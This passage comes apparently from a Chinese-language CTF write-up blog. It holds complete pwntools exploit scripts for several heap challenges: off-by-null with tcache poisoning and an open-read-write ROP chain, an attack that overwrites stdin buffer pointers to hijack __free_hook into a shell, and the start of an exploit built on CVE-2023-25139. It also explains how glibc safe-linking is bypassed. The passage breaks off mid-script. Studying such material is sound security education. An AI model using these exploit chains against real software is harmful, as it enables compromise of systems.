class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./nb&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;pwn-9c590524c0.challenge.xctf.org.cn&quot;, 9999, ssl=True)</span></span><br><span class="line">p=process(elf_path)</span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(cintent)</span><br><span class="line">itr =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cho</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Chioce &gt;&gt; &#x27;</span>,tbs(cho))</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Size: &#x27;</span>,tbs(size))</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Index: &#x27;</span>,tbs(idx))</span><br><span class="line">	sa(<span class="string">b&#x27;Note: &#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Index: &#x27;</span>,tbs(idx))</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Index: &#x27;</span>,tbs(idx))</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">	add(<span class="number">0x78</span>)</span><br><span class="line">	edit(i,(p64(<span class="number">0x100</span>)+p64(<span class="number">0x20</span>))*<span class="number">7</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	delete(<span class="number">0xf</span>-i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	delete(<span class="number">0xf</span>-<span class="number">7</span>-i)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">debug()	</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">libc.address=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219CE0</span>-<span class="number">0x1f0</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">	add(<span class="number">0x78</span>)</span><br><span class="line">	</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">heap=u64(r(<span class="number">5</span>).rjust(<span class="number">6</span>,<span class="string">b&#x27;\x00&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))*<span class="number">16</span></span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,p64(heap+<span class="number">0x510</span>)+p64(heap+<span class="number">0x510</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">environ=libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;environ&#x27;</span>,environ)</span><br><span class="line">edit(<span class="number">7</span>,p64(environ^(heap&gt;&gt;<span class="number">12</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">stack=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x130</span></span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64((stack-<span class="number">0x18</span>)^(heap&gt;&gt;<span class="number">12</span>)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">nnn=heap+<span class="number">0x8a0</span></span><br><span class="line">mmm=heap+<span class="number">0x820</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>,p64(mmm-<span class="number">8</span>)+p64(libc.address+<span class="number">0x2a3e5</span>)+p64(heap+<span class="number">0x520</span>)+p64(libc.address+<span class="number">0x45eb0</span>)+p64(<span class="number">2</span>)+p64(libc.address+<span class="number">0x796a2</span>)+p64(<span class="number">0</span>)+p64(libc.address+<span class="number">0x1214ee</span>)+p64(<span class="number">0</span>)+p64(libc.address+<span class="number">0x91316</span>)+p64(libc.address+<span class="number">0x2a3e5</span>)+p64(<span class="number">3</span>)+p64(libc.address+<span class="number">0x4da83</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(libc.address+<span class="number">0x1214ee</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0x530</span>)+p64(libc.address+<span class="number">0x796a2</span>)+p64(<span class="number">0x100</span>)+p64(libc.address+<span class="number">0x45eb0</span>)+p64(<span class="number">0</span>)+p64(libc.address+<span class="number">0x91316</span>)</span><br><span class="line">payload+=p64(libc.address+<span class="number">0x2a3e5</span>)+p64(<span class="number">1</span>)+p64(libc.address+<span class="number">0x1214ee</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0x530</span>)+p64(libc.address+<span class="number">0x45eb0</span>)+p64(<span class="number">1</span>)+p64(libc.address+<span class="number">0x91316</span>)</span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(6,p64(heap)+p64(libc.address+0x2a3e5)+p64(0)+p64(libc.address+0x2be51)+p64(heap)+p64(libc.sym[&#x27;read&#x27;])+p64(libc.address+0x562ec))</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(nnn)+p64(libc.address+<span class="number">0x4da83</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
<p><strong>需要注意的几个点:</strong></p>
<ol>
<li>可以看到开始申请chunk的时候,<code>edit(i,(p64(0x100)+p64(0x20))*7)</code>往堆里填充p64(0x100)+p64(0x20),这就是未之后的off-by-null做准备,C0的size被写为0x100时,往后找到的chunk就会以写入的p64(0x100)+p64(0x20)作为prev_size和size,保持堆不被破坏,并且绕过许多物理相邻chunk检查</li>
<li>orw时,open的参数大多数时候可以只顾第一个参数也就是文件名指针,那可能是因为遗留的第二三个指针的值恰好合适,这次遇到了一个问题,open无法正确打开文件,因此还需要清空其第二三个参数,不过远程打通了,本地通不了(read永远读入0个字符)</li>
<li>这里exp泄露heap地址时其实可以与上一步合并一起利用,exp里其实多做了一些步骤,具体做法是再释放两个不相邻的chunk,之后接连取出,泄露bk字段</li>
<li>2.32及以上fastbin和tcache进行了加密,所以进行tcache攻击时需要先处理目标地址</li>
</ol>
<h2 id="关于tcache和fast加密后的heap-leak"><a href="#关于tcache和fast加密后的heap-leak" class="headerlink" title="关于tcache和fast加密后的heap leak"></a>关于tcache和fast加密后的heap leak</h2><p>在2.32版本中加入了关于tcache和fast的加密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不过这个加密十分简单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>
<p>现在无法像以往那样直接泄露heap</p>
<p>如果某个chunk并不是第一个放入处于空状态的tcache的chunk,那么就无法泄露heap</p>
<p>不过如果这个chunk是第一个放入处于空状态的tcache,那么因为tcache-&gt;counts[tc_idx]在tcache为空时默认为0,也就是说该chunk的next字段是由其next字段地址右移12位与0异或得到的,也就是next字段地址右移12位,再结合heap页对齐,便能够泄露heap了</p>
<h1 id="2023hitctf-scanf"><a href="#2023hitctf-scanf" class="headerlink" title="2023hitctf-scanf"></a>2023hitctf-scanf</h1><p><strong>标签:scanf利用|stdin利用|堆</strong></p>
<p><strong>题目介绍:</strong></p>
<p>程序提供了两个申请chunk的接口,每次malloc后会立即要求向其中scanf一个数字</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v0 == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  qword_4060 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, qword_4060);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v0 == <span class="string">&#x27;[&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">      ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, ptr);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>以及对应的free,在free前会将fd字段作为一个数字输出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( qword_4060 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, *(_QWORD *)qword_4060);</span><br><span class="line">  <span class="built_in">free</span>(qword_4060);</span><br><span class="line">  qword_4060 = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">if</span> ( ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">int</span> *)ptr);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      ptr = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>此外还提供了一次单字节置零的机会,以及一个getchar接口</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !qword_4078 )</span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, &amp;qword_4078, <span class="number">8uLL</span>);</span><br><span class="line">  *(_BYTE *)qword_4078 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( v0 == <span class="string">&#x27;(&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  byte_4068 = getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p>因为处于free的chunk最多只能有两个,且没有足够的操作接口,使得我们无法利用常规的方案</p>
<p>不过无论如何,必做的都是泄露libc</p>
<p>此处我们可以利用scanf读取大数字时触发malloc_consolidate</p>
<p>使得释放的chunk被放入smallbin从而在fd字段写上libc</p>
<p>但是malloc后程序强制我们向fd字段scanf,而scanf又会改变其中的libc,这时候可以用到scanf读数字绕过,即发送<code>+-.</code>三个字符中任意一个</p>
<p>成功泄露libc后,接下来又该如何利用</p>
<p>考虑到程序提供的单字节置零还没使用,于是有可以利用stdin任意写</p>
<p>通过单字节置零将stdin结构体的_IO_buf_base的最低字节置零,使其指向自身</p>
<p>在此之前先将<code>/bin/sh\0</code>字符串解包以十进制数发送以获得字符串</p>
<p>然后置零</p>
<p>观察stdin结构体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7f904eccb8e0 &lt;_IO_2_1_stdin_&gt;:	0x00000000fbad208b	0x00007f904eccb963</span><br><span class="line">0x7f904eccb8f0 &lt;_IO_2_1_stdin_+16&gt;:	0x00007f904eccb964	0x00007f904eccb963</span><br><span class="line">0x7f904eccb900 &lt;_IO_2_1_stdin_+32&gt;:	0x00007f904eccb963	0x00007f904eccb963</span><br><span class="line">0x7f904eccb910 &lt;_IO_2_1_stdin_+48&gt;:	0x00007f904eccb963	0x00007f904eccb963</span><br><span class="line">0x7f904eccb920 &lt;_IO_2_1_stdin_+64&gt;:	0x00007f904eccb964	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>_IO_buf_base的最低字节置零的话,要填充3个字段才能再次到_IO_buf_base字段</p>
<p>将_IO_buf_base设为free_hook的地址,_IO_buf_base改为free_hook+8</p>
<p>然后此时_IO_read_ptr!=_IO_read_end</p>
<p>读取了0x28个字符,虽然是scanf读的但因为第一个字符为非数字字符所以直接接跳过了,所以不需要换行</p>
<p>所以需要使用getchar*0x28次</p>
<p>然后再读取就能改写free_hook了</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">	gdb.attach(io)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;&#123;&#125;[&#123;&#125;]&#123;*[]&#x27;</span> + <span class="string">b&#x27;(&#x27;</span> * <span class="number">0x28</span> + <span class="string">b&#x27;[&#125;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(<span class="string">b&#x27;9&#x27;</span> * <span class="number">0x400</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recvline(keepends=<span class="literal">False</span>)) - <span class="number">0x3c4b98</span></span><br><span class="line">free_hook_addr = libc_base + <span class="number">0x3c67a8</span></span><br><span class="line">stdin_addr = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">stdin_buf_base_addr = stdin_addr + <span class="number">0x8</span> * <span class="number">7</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libc_base: %x&#x27;</span>, libc_base)</span><br><span class="line">success(<span class="string">&#x27;stdin: %x&#x27;</span>, stdin_addr)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(<span class="built_in">str</span>(u64(<span class="string">b&#x27;/bin/sh\0&#x27;</span>)).encode())</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">io.send(p64(stdin_buf_base_addr))</span><br><span class="line"></span><br><span class="line">io.send(p64(stdin_addr + <span class="number">0x83</span>) * <span class="number">3</span> + p64(free_hook_addr) + p64(free_hook_addr +</span><br><span class="line"><span class="number">0x8</span>))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.recvline()</span><br><span class="line"><span class="comment">#for i in range(0x28):</span></span><br><span class="line"><span class="comment">#	io.send(b&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">io.send(p64(system_addr))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="2023tpctf-safehttpd"><a href="#2023tpctf-safehttpd" class="headerlink" title="2023tpctf-safehttpd"></a>2023tpctf-safehttpd</h1><p><strong>标签:CVE-2023-25139|堆</strong></p>
<p><strong>题目介绍:</strong></p>
<p>这题可以说一半的难度来自于逆向,逆向的量比较大,要搞清楚程序在做什么要花不少时间</p>
<p>不过只要足够的耐心,按照理解一个个将变量与函数命名,总能搞懂的</p>
<p>此外还用到了一个setlocale函数的cve,具体介绍在下方</p>
<p>这道题的第一大难点就是完成与程序交互的脚本</p>
<p>也就是上面说的逆向,完成了这一步</p>
<p>程序对每一个用户都会分配一个管理chunk(内部蕴含一个用来写的指针)</p>
<p>接下来就是利用CVE-2023-25139造成的缓冲区溢出使得一个管理chunk的写指针指向另一个管理指针,进而控制其写指针</p>
<p>并辅以利用程序判断用户时利用<strong>‘:’</strong>切割,使得原本只能由root使用的show和note功能可以被使用</p>
<p>构造时注意setlocale函数会产生大量的堆利用痕迹</p>
<p>那么此时已经可以做到任意地址任意写了</p>
<p>到这里,之后的利用就十分轻易了</p>
<p>可以采用泄露<code>__environ</code>符号,修改返回地址进行rop攻击与之前的强网拟态noo_heap大致相同</p>
<p>当然若是要采用io流攻击也是可以的</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">c = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(c):</span><br><span class="line">        gdb.attach(p, c)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">r   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span 